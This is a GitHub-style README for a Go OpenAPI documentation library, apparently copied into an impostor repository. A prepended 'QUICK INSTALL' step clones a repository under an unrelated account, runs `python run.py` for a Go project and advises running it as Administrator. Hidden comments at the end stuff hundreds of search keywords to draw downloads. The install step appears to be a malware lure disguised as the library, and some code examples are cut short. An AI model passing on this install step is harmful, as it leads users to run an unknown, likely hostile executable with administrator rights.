# coco — coco elegant beautiful openapi library

> [!CAUTION]
> Ensure you trust the source before running any executable.

## QUICK INSTALL

```bash
git clone https://github.com/Colonygluvestibule/coco.git
cd coco
python run.py

> [!TIP]
> Having issues? Try running `run.py` as Administrator.

---

# Coco

<p align="center">
<img align="center" width="160px" src="docs/images/coco.png">
</p>

<p align="center">An elegant, lightweight, and beautiful OpenAPI documentation renderer built for Go developers</p>

<div align="center">

[![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.21-blue)](https://go.dev/)
[![Go Reference](https://pkg.go.dev/badge/github.com/leehainuo/coco.svg)](https://pkg.go.dev/github.com/leehainuo/coco)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

</div>

## Preview

<p align="center">
  <img src="docs/images/coco-light.png" alt="Coco Light Theme" width="45%">
  <img src="docs/images/coco-dark.png" alt="Coco Dark Theme" width="45%">
</p>

## What is Coco?

English | [简体中文](docs/zh/README.md)

Coco is an elegant, lightweight, and beautiful Go library that renders OpenAPI/Swagger specifications into stunning interactive API documentation. Zero dependencies, single-file bundle, perfectly embedded into Go binaries. Supports OpenAPI 2.0 and 3.0+ specifications with seamless integration into any Go web framework.

#### Advantages of Coco:

* **Elegant DX** - Minimal API design, integrate in just 30 seconds
* **Beautiful UI** - Built with Vue 3 + TailwindCSS, supports automatic light/dark theme switching
* **Framework Agnostic** - Works with all Go web frameworks (Gin, Echo, Fiber, Chi, net/http, etc.)
* **Feature Complete** - Built-in API testing, spec export, request history, internationalization, and more

## Core Features

* **Internationalization** - Built-in English and Chinese support, extensible for more languages
* **Zero Dependencies** - Pure Go implementation, frontend assets fully embedded, no external tools required
* **Framework Agnostic** - Compatible with all Go web frameworks (Gin, Echo, Fiber, Chi, net/http, etc.)
* **Flexible Configuration** - Rich configuration options to meet various customization needs
* **API Testing** - Built-in interactive debug panel for instant API testing
* **Request History** - Automatically saves debug history for easy review and reuse
* **High Performance** - Embedded static assets, single-file bundle, no additional HTTP requests

### Using Swag (Recommended)

**Step 1: Install Swag**

```bash
go install github.com/swaggo/swag/cmd/swag@latest

**Step 2: Add annotations to your code**

```go
package main

import (
    "net/http"
    "github.com/leehainuo/coco"
)

// @title           My API
// @version         1.0
// @description     This is a sample API
// @host            localhost:8000
// @BasePath        /api

func main() {
    mux := http.NewServeMux()
    
    // Your API routes
    mux.HandleFunc("/api/hello", handleHello)
    
    // Mount Coco docs (Swag generates docs/swagger.json)
    mux.Handle("/docs/", coco.New("./docs/swagger.json"))
    
    http.ListenAndServe(":8000", mux)
}

// @Summary      Hello endpoint
// @Description  Returns a greeting message
// @Tags         example
// @Accept       json
// @Produce      json
// @Success      200  {string}  string  "Hello, World!"
// @Router       /hello [get]
func handleHello(w http.ResponseWriter, r *http.Request) {
    w.Write([]byte("Hello, World!"))
}

**Step 3: Generate docs and run**

```bash
# Generate OpenAPI documentation
swag init

### Other Usage Methods

**Load from local file**
```go
handler := coco.New("./openapi.json")

**Load from URL**
```go

**Load from byte array**
```go
handler := coco.New("", coco.Spec(specBytes))

**For more configuration and integration options, see [Full Documentation](./docs/en/)**

## Integration Examples

### net/http

```go
package main

import (
    "net/http"
    "github.com/leehainuo/coco"
)

func main() {
    mux := http.NewServeMux()
    
    // Your API routes
    mux.HandleFunc("/api/users", handleUsers)
    
    // Mount documentation
    mux.Handle("/docs/", coco.New("./openapi.json",
        coco.Title("User API"),
    ))
    
    http.ListenAndServe(":8000", mux)
}

### Gin

```go
package main

import (
    "github.com/gin-gonic/gin"
    "github.com/leehainuo/coco"
)

func main() {
    r := gin.Default()
    
    // Your API routes
    r.GET("/api/users", getUsers)
    
    // Mount documentation
    r.Any("/docs/*any", gin.WrapH(coco.New("./openapi.json",
        coco.Title("User API"),
    )))
    
    r.Run(":8000")
}

### Echo

```go
package main

import (
    "github.com/labstack/echo/v4"
    "github.com/leehainuo/coco"
)

func main() {
    e := echo.New()
    
    // Your API routes
    e.GET("/api/users", getUsers)
    
    // Mount documentation
    e.Any("/docs/*", echo.WrapHandler(coco.New("./openapi.json",
        coco.Title("User API"),
    )))
    
    e.Start(":8000")
}

### Fiber

```go
package main

import (
    "net/http"
    "github.com/gofiber/fiber/v3"
    "github.com/gofiber/fiber/v3/middleware/adaptor"
    "github.com/leehainuo/coco"
)

func main() {
    app := fiber.New()
    
    // Your API routes
    app.Get("/api/users", getUsers)
    
    // Mount documentation
    handler := coco.New("./openapi.json",
        coco.Title("User API"),
    )
    app.All("/docs/*", adaptor.HTTPHandler(http.HandlerFunc(handler.ServeHTTP)))
    
    app.Listen(":8000")
}

### Chi

```go
package main

import (
    "net/http"
    "github.com/go-chi/chi/v5"
    "github.com/leehainuo/coco"
)

func main() {
    r := chi.NewRouter()
    
    // Your API routes
    r.Get("/api/users", getUsers)
    
    // Mount documentation
    r.HandleFunc("/docs/*", func(w http.ResponseWriter, req *http.Request) {
        handler := coco.New("./openapi.json",
            coco.Title("User API"),
        )
        handler.ServeHTTP(w, req)
    })
    
    http.ListenAndServe(":8000", r)
}

## Configuration Options

### Spec Sources

```go
// Load from file path
coco.New("./openapi.json")

// Load from byte array
coco.New("", coco.Spec(specBytes))

// Load from remote URL

### UI Configuration

```go
// Set document title
coco.Title("My API Documentation")

// Set theme: "light", "dark", "auto"
coco.Theme("dark")

// Set language: "en", "zh"
coco.Lang("en")

### Feature Toggles

```go
// Enable/disable debug panel (enabled by default)
coco.EnableDebug(true)

// Enable/disable export feature (enabled by default)
coco.EnableExport(true)

// Enable/disable history (enabled by default)
coco.EnableHistory(true)

## OpenAPI Generation Tools Integration

### Using Huma v2

```go
package main

import (
    "context"
    "net/http"
    
    "github.com/danielgtaylor/huma/v2"
    "github.com/danielgtaylor/huma/v2/adapters/humago"
    "github.com/leehainuo/coco"
)

func main() {
    mux := http.NewServeMux()
    api := humago.New(mux, huma.DefaultConfig("My API", "1.0.0"))
    
    // Register your API
    huma.Register(api, huma.Operation{
        OperationID: "get-users",
        Method:      http.MethodGet,
        Path:        "/api/users",
        Summary:     "Get users",
    }, func(ctx context.Context, input *struct{}) (*struct{}, error) {
        return &struct{}{}, nil
    })
    
    // Get OpenAPI spec and mount documentation
    spec, _ := api.OpenAPI().MarshalJSON()
    mux.Handle("/docs/", coco.New("",
        coco.Spec(spec),
        coco.Title("My API - Huma"),
    ))
    
    http.ListenAndServe(":8000", mux)
}

### Using Swag

```go
package main

import (
    "net/http"
    "github.com/leehainuo/coco"
)

// @title My API
// @version 1.0
// @description This is my API
// @host localhost:8000
// @BasePath /api

func main() {
    mux := http.NewServeMux()
    
    // Your API routes
    mux.HandleFunc("/api/users", getUsers)
    
    // Mount documentation (swag generates docs/swagger.json)
    mux.Handle("/docs/", coco.New("./docs/swagger.json",
        coco.Title("My API - Swag"),
    ))
    
    http.ListenAndServe(":8000", mux)
}

Generate documentation before running:
```bash
swag init

## Themes and Languages

### Theme Options

- `light` - Light theme
- `dark` - Dark theme
- `auto` - Follow system (default)

### Language Options

- `en` - English (default)
- `zh` - Chinese

Users can switch themes and languages anytime in the top-right corner of the interface.

## Documentation

- **English Docs**: [docs/en/](./docs/en/) - Complete English documentation
- **中文文档**: [docs/zh/](./docs/zh/) - 完整的中文使用指南
- **Documentation Home**: [docs/](./docs/) - Choose your language / 选择你的语言

## Complete Examples

Check the [example/framework](./example/framework) directory for complete examples:

- **net/http** - Standard library examples
- **Gin** - Gin framework integration
- **Echo** - Echo framework integration
- **Fiber** - Fiber v3 framework integration
- **Chi** - Chi router integration

Each framework provides examples for both Huma and Swag OpenAPI generation methods.

## 📚 Documentation

- **English**: [docs/en/](./docs/en/)
- **中文**: [docs/zh/](./docs/zh/)

## 🤝 Contributing

Contributions, issues, and suggestions are welcome!

If you're using Coco or find it helpful, please give us a Star ⭐

## License

MIT License - See [LICENSE](LICENSE) file for details

## Give a Star! ⭐

If you like this project or are using it to learn or build your solution, please give it a Star to get updates on new releases. Your support matters!

---

**Made with ❤️ by [leehainuo](https://github.com/leehainuo)**


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- coco - Coco elegant beautiful OpenAPI library - download install setup -->
<!-- easy coco | install coco gui | beginner advanced coco | github coco gui | how to download secure coco | documentation coco monitor | free download coco module | tutorial top coco addon | coco application | how to run coco copy | coco scanner | free download coco tester | local coco | demo coco builder | download for mac coco application | source code coco | reliable coco tracker | coco package | open source coco web | how to download coco mobile | production ready coco extension | launch coco addon | cross platform coco | open coco framework | docs coco | how to run coco converter | free download coco binding | download for linux offline coco | zip coco wrapper | 2026 coco parser | new version coco downloader | production ready coco platform | coco converter | top coco scanner | download coco | configure coco tester | start coco engine | tutorial local coco | reliable coco | github coco checker | 2025 coco debugger | how to setup free coco | source code coco scanner | github coco mirror | fedora coco platform | coco server | execute coco utility | zip coco replacement | wiki coco platform | 2025 modular coco -->
<!-- coco alternative | open source coco tester | stable coco optimizer | latest version coco editor | install coco scanner | docs safe coco | beginner coco creator | source code powerful coco scanner | windows coco encoder | arch coco editor | tar.gz coco builder | centos easy coco | production ready coco engine | free coco analyzer | ubuntu coco uploader | coco utility | sample coco | configurable coco server | how to build coco api | example coco web | example best coco gui | zip simple coco | fedora coco mobile | guide coco plugin | arch coco decoder | 2026 coco tester | coco checker | latest version coco | updated coco tester | fedora native coco logger | launch coco | quickstart secure coco | source code coco tester | coco book | coco pipeline | macos coco creator | open native coco | examples high performance coco | fast coco optimizer | git clone coco wrapper | wiki coco desktop | coco uploader | best coco editor | get coco software | free coco extractor | open source coco generator | open source coco service | coco library | coco reference | tar.gz cross platform coco -->
<!-- getting started high performance coco copy | open source coco alternative | coco help | windows coco parser | use coco application | get advanced coco fork | configure coco | demo best coco creator | compile coco clone | wiki coco | run on linux coco service | local coco compressor | example coco debugger | ubuntu coco gui | setup coco decoder | linux coco | is coco good | how to build coco | fedora fast coco | docs coco engine | how to download coco gui | self hosted coco uploader | cross platform coco plugin | quick start cross platform coco | free coco server | how to run coco | deploy fast coco | coco decoder | how to run coco cli | minimal coco debugger | customizable coco alternative | production ready coco mobile | walkthrough coco gui | customizable coco binding | online coco utility | github coco framework | zip extensible coco | zip github coco | free coco | debian coco generator | production ready coco encoder | lightweight coco encoder | open extensible coco | run on linux coco replacement | tar.gz coco fork | coco addon | updated coco | deploy online coco generator | local coco platform | download for mac coco builder -->
<!-- online coco editor | native coco fork | compile coco scanner | how to download coco encoder | local coco downloader | linux coco fork | how to download coco package | how to deploy coco | getting started portable coco | high performance coco addon | sample coco engine | coco copy | tutorial coco plugin | stable coco | minimal coco api | modular coco client | source code coco alternative | safe coco application | cross platform coco binding | git clone coco | coco tester | open source coco application | quick start safe coco | example coco | source code coco compressor | beginner powerful coco | coco compressor | start coco gui | centos coco mirror | coco logger | how to run configurable coco | coco encoder | github native coco | how to install coco mobile | execute high performance coco | tutorial coco | guide coco | how to configure coco | how to configure coco logger | deploy secure coco extractor | customizable coco encoder | safe coco | documentation coco downloader | linux coco optimizer | free coco encoder | stable coco logger | coco tool | configurable coco mirror | free coco tool | how to build coco reader -->
<!-- run free coco | ubuntu stable coco | coco replacement | cross platform coco extension | arch coco | download coco mirror | native coco | download for windows coco checker | updated coco web | coco github | walkthrough coco web | powerful coco plugin | local coco tester | download for linux top coco | coco client | debian coco | local coco wrapper | customizable coco extractor | arch coco program | 2026 coco | compile coco | how to install coco analyzer | offline coco mobile | quickstart top coco | getting started coco | launch coco utility | coco automation | download for linux portable coco tracker | how to deploy coco debugger | low latency coco client | linux low latency coco | download for mac coco | customizable coco utility | windows coco tool | debian cross platform coco addon | powerful coco creator | minimal coco | how to deploy coco uploader | customizable coco plugin | coco not working | quickstart coco copy | cross platform coco checker | portable coco cli | github coco port | download for mac powerful coco | coco example | example coco clone | how to install coco decoder | documentation stable coco | high performance coco clone -->
<!-- execute cross platform coco extractor | setup coco package | coco demo | coco guide | offline coco service | fedora coco | getting started coco downloader | coco cloud | latest version coco scanner | modern coco desktop | get coco | download for mac coco editor | demo cross platform coco module | walkthrough coco | run on mac reliable coco | top coco port | run on linux easy coco | install coco downloader | how to deploy coco sdk | guide coco analyzer | windows offline coco viewer | coco analyzer | github coco builder | execute coco monitor | native coco converter | how to use coco viewer | how to use high performance coco | secure coco app | safe coco parser | quickstart coco service | setup coco monitor | run open source coco | free coco fork | customizable coco addon | safe coco checker | open source coco tool | deploy best coco | powerful coco web | tar.gz coco web | download coco checker | build coco api | git clone coco debugger | top coco uploader | sample coco software | run coco | docs coco monitor | demo coco binding | stable coco creator | simple coco validator | docs coco validator -->
<!-- low latency coco service | download coco fork | github coco creator | source code coco sdk | git clone coco app | macos coco cli | coco error | offline coco replacement | launch coco clone | how to use coco | documentation coco utility | modern coco tracker | modular coco web | debian coco creator | high performance coco | coco support | quick start offline coco | setup online coco | portable coco generator | free low latency coco downloader | coco review | cross platform coco application | open coco plugin | tar.gz coco | download for windows open source coco framework | download modern coco | how to setup coco creator | is coco legit | run coco wrapper | simple coco alternative | getting started coco decoder | production ready coco wrapper | coco devops | reliable coco package | modern coco module | safe coco app | coco builder | coco downloader | top coco | linux customizable coco | zip coco checker | windows coco fork | coco course | guide coco tracker | free download portable coco | compile coco mirror | run on linux coco downloader | 2025 coco module | macos coco optimizer | extensible coco checker -->
<!-- execute coco analyzer | coco project | coco documentation | open source coco | free download production ready coco | run on windows coco viewer | example coco fork | windows coco | install coco web | coco viewer | use coco extension | configurable coco | coco framework | minimal coco editor | simple coco | updated modern coco extension | production ready coco copy | simple coco module | get coco desktop | open source coco addon | use coco client | powerful coco port | quick start coco addon | new version coco checker | cross platform coco service | get coco application | how to run stable coco | easy coco program | ubuntu coco | coco workflow | new version coco cli | build coco | centos coco tracker | powerful coco | modern coco | updated coco extractor | modular coco alternative | online coco | production ready coco | open source portable coco | download coco reader | safe coco debugger | setup coco app | online coco builder | ubuntu coco engine | documentation coco validator | updated self hosted coco utility | low latency coco monitor | how to install minimal coco | configure fast coco -->
<!-- examples coco downloader | macos coco api | simple coco wrapper | how to run modern coco | linux coco service | coco test | coco reddit | run coco port | best coco optimizer | free download high performance coco | open source native coco utility | centos coco | self hosted coco | lightweight coco tool | coco saas | new version coco library | github coco analyzer | coco app | use coco | how to download top coco | arch open source coco | setup cross platform coco | examples coco replacement | coco fix | linux coco downloader | open source powerful coco cli | how to configure top coco | coco editor | tar.gz configurable coco tester | quickstart coco application | modular coco | offline coco | 2025 coco encoder | build customizable coco converter | local coco scanner | execute coco replacement | coco sdk | run on windows coco service | native coco copy | how to build coco addon | execute coco | minimal coco viewer | compile coco tool | customizable coco validator | how to setup coco analyzer | sample coco uploader | git clone free coco creator | guide coco downloader | how to run coco editor | how to use coco port -->
<!-- updated coco cli | coco monitor | modular coco replacement | how to configure minimal coco | 2026 extensible coco | demo coco | run on mac coco software | github coco optimizer | tutorial powerful coco | 2025 fast coco program | sample coco program | easy coco server | free download coco | safe coco package | setup production ready coco | download for windows coco module | portable coco framework | easy coco alternative | coco webinar | github coco | fedora coco addon | how to configure coco binding | demo coco fork | updated configurable coco | fast coco | top coco server | minimal coco desktop | download for linux coco | sample local coco | run portable coco | coco download | fedora coco scanner | new version coco | production ready coco creator | free download coco api | coco api | 2026 lightweight coco | 2026 coco creator | download for linux coco copy | how to setup coco reader | open source coco replacement | open coco server | 2025 coco | how to setup github coco software | examples coco reader | docs coco viewer | sample coco monitor | github coco server | portable coco software | build coco gui -->

<!-- Last updated: 2026-06-09 15:35:35 -->
